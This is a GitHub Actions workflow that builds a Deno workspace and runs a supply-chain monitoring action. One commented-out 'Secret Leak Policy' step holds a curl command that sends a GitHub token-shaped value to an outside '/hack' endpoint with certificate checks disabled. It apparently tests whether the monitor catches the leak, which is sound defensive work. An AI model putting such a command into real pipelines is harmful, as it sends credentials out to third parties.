name: Deno Workspace build latest

on:
  workflow_dispatch:
  
permissions:
  checks: write
  contents: write
  packages: read
  actions: write

jobs:
  DENO:
    runs-on: ubuntu-latest
    name: Run build
    env:
      DENO_TLS_CA_STORE: system

    steps:
      - name: Setup PSE
        uses: invisirisk/pse-action@feat/use-pse-data-collector
        with:
          api_url: "https://app.dev.invisirisk.com"
          app_token: ${{ secrets.IR_API_KEY }}
          # workdir: pkg-api
          debug: true
      # - name: Secret Leak Policy
      #   run: |
      #     curl -k -X GET https://vbirmock.free.beeceptor.com/hack \
      #       -H "Content-Type: application/json" \
      #       -d '{
      #       "GH": "ghp_DEFzmg7RHrQ2eMe2IF4NxNWQodYpab3VMXXX"
      #     }'
      #     echo "Exit code: $?"

      - name: Checkout code
        uses: actions/checkout@v4

      - name: Set up Deno
        uses: denoland/setup-deno@v2
        with:
          deno-version: v2.x

      - name: Install dependencies
        run: deno install
